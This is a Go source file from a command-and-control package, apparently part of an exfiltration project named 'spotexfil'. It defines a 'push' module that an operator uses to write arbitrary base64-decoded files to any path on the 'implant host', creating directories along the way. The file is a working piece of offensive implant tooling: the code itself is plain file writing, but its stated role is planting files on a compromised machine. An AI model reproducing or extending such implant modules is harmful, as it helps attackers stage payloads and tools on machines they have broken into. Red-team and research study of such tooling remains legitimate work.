package c2

import (
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"

	"github.com/sourcefrenchy/spotexfil/internal/shared"
)

// PushModule writes a base64-encoded file to the implant host.
type PushModule struct{}

func (m *PushModule) Name() string { return "push" }

func (m *PushModule) Execute(args map[string]interface{}) (string, string) {
	path, _ := args["path"].(string)
	if path == "" {
		return "error", "Empty path"
	}
	data, _ := args["data"].(string)
	if data == "" {
		return "error", "Empty data"
	}
	content, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return "error", "Invalid base64 data"
	}
	maxSize := shared.Proto.C2.MaxResultSize
	if len(content) > maxSize {
		return "error", fmt.Sprintf("File too large: %d bytes (max %d)", len(content), maxSize)
	}
	dir := filepath.Dir(path)
	if dir != "" && dir != "." {
		if err := os.MkdirAll(dir, 0755); err != nil {
			return "error", err.Error()
		}
	}
	if err := os.WriteFile(path, content, 0600); err != nil {
		return "error", err.Error()
	}
	return "ok", fmt.Sprintf("Wrote %d bytes to %s", len(content), path)
}
